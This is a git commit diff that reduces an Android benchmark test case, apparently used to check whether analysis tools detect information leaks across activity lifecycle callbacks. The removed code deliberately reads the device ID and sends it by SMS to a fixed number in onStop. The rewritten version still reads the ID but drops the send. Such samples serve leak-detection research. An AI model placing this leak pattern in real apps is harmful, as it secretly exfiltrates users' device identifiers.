495f63b58525a77f718396a24218d5d8d50dc827
Dakota Soles <djs190000@utdallas.edu>
2021-01-14 18:05:29 -0600

    First test run of fossdroid app code

--- APKReductionDir/test_resources/MinimizedFlows/ActivityEventSequence2/ActivityEventSequence2_0/source_code/app/src/main/java/edu/uta/ActivityEventSequence2.java
+++ APKReductionDir/test_resources/MinimizedFlows/ActivityEventSequence2/ActivityEventSequence2_0/source_code/app/src/main/java/edu/uta/ActivityEventSequence2.java
@@ -6,71 +6,33 @@ import android.os.Bundle;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 
-/**s
- * @testcase_name Lifecycle_ActivityEventSequence2
- * 
- * @description   Testing if information leak due to triggering a sequence of events (not activity callbacks) can be detected. Each event can invoke a sequence of callbacks in the activity. 
- * @dataflow onResume :source -> onSaveInstanceState -> onRestoreInstanceState -> onResume: sink
- * @number_of_leaks 1
- * @challenges  The analysis tool must be able to detect data leaks which are triggered by different ordering of event sequences. Each event in the event sequence invokes a set of callbacks in a specific order. Following attack occurs when onUserLeaveHint() -> onUserLeaveHint()->onSaveInstanceState()->onRestoreInstanceState()->onSaveInstanceState() callbacks are invoked in the given order. 
- * 
+/**
+ * s
+ *  @testcase_name Lifecycle_ActivityEventSequence2
+ *
+ *  @description   Testing if information leak due to triggering a sequence of events (not activity callbacks) can be detected. Each event can invoke a sequence of callbacks in the activity.
+ *  @dataflow onResume :source -> onSaveInstanceState -> onRestoreInstanceState -> onResume: sink
+ *  @number_of_leaks 1
+ *  @challenges  The analysis tool must be able to detect data leaks which are triggered by different ordering of event sequences. Each event in the event sequence invokes a set of callbacks in a specific order. Following attack occurs when onUserLeaveHint() -> onUserLeaveHint()->onSaveInstanceState()->onRestoreInstanceState()->onSaveInstanceState() callbacks are invoked in the given order.
  */
-
 public class ActivityEventSequence2 extends Activity {
 
-	private String d1 = "";
-	private String d2 = "";
-	private String d3 = "";
-	private String d4 = "";
-	private String recpNo = "5556";
-	@Override
-	public void onCreate(Bundle instance){
-		super.onCreate(instance);
+    private String d1 = "";
 
-		setContentView(R.layout.activity_main);
-	}
+    private String recpNo = "5556";
 
+    @Override
+    public void onStart() {
+        TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
+        this.d1 = tMgr.getDeviceId();
+    }
 
-	@SuppressLint("MissingSuperCall")
-	@Override
-	protected void onRestart()
-	{
-		super.onStart();
-		this.d1 = "";
+    @Override
+    public void onSaveInstanceState(Bundle state) {
+        this.d1 = "";
+    }
 
-	}
-
-	
-	@Override
-	public void onStart()
-	{
-		super.onStart();
-		TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
-		this.d1 = tMgr.getDeviceId();
-		
-	}
-	@Override
-	public void onResume()
-	{
-		super.onResume();
-		this.d1 = "";
-	}
-	
-	@Override
-	public void onSaveInstanceState(Bundle state)
-	{
-		this.d1 = "";
-		super.onSaveInstanceState(state);
-		
-	}
-	
-	@Override
-	public void onStop()
-	{
-		super.onStop();
-		if(!d1.isEmpty())
-			SmsManager.getDefault().sendTextMessage(recpNo, null, d1, null, null);
-		
-	}
-
+    @Override
+    public void onStop() {
+    }
 }
